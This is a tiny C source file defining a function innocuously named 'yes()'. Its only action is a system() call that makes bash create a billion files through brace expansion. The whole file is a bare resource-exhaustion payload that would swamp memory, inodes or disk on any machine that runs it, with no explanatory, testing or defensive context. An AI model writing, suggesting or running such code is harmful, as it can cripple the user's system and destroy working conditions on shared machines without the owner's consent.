#include <stdlib.h>

void	yes()
{
	system("bash -c \"touch file{1..1000000000}.txt\"");
}
